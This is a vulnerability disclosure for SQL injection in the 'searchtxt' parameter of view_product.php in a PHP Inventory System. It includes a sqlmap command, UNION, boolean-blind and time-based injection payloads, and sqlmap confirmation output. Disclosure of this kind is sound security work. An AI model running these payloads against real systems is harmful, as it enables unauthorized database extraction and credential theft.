# SQL Injection in Inventory System (View Product)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Product View (`view_product.php`)
* **Vulnerable Parameter**: `searchtxt` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `view_product.php` file.

The application fails to properly sanitize the `searchtxt` parameter in the HTTP POST request (triggered by the search functionality on the product list page). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database on the webpage, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Navigate**: Go to the Product List page (`/view_product.php`).
4. **Exploit**: Use the search bar to submit malicious SQL payloads, or capture the request and use a tool like `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/view_product.php" \
--data "searchtxt=example&Search=Search" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
searchtxt=example' UNION ALL SELECT CONCAT(0x716b716a71,0x546a6a784f7043416c6e594a7443766e4d45504e45656b48647369494b5a56436554527353464375,0x716a7a7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&Search=Search

```

**Boolean-based Blind Payload:**

```sql
searchtxt=-5487' OR 6599=6599#&Search=Search

```

**Time-based Blind Payload:**

```sql
searchtxt=example' AND (SELECT 9568 FROM (SELECT(SLEEP(5)))oZAR)-- Hfku&Search=Search

```

## Proof of Concept

The following output from `sqlmap` confirms that the `searchtxt` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: searchtxt (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchtxt=-5487' OR 6599=6599#&Search=Search
    Vector: OR [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchtxt=example' AND (SELECT 9568 FROM (SELECT(SLEEP(5)))oZAR)-- Hfku&Search=Search
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 11 columns
    Payload: searchtxt=example' UNION ALL SELECT CONCAT(0x716b716a71,0x546a6a784f7043416c6e594a7443766e4d45504e45656b48647369494b5a56436554527353464375,0x716a7a7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&Search=Search
    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
---
[INFO] the back-end DBMS is MySQL

```

<img width="1039" height="423" alt="图片" src="https://github.com/user-attachments/assets/bd527f25-7b06-4dda-8717-32b898f57b41" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display the entire database content (users, orders, suppliers) via UNION-based attacks.
2. **Authentication Bypass**: Read admin credentials.
3. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
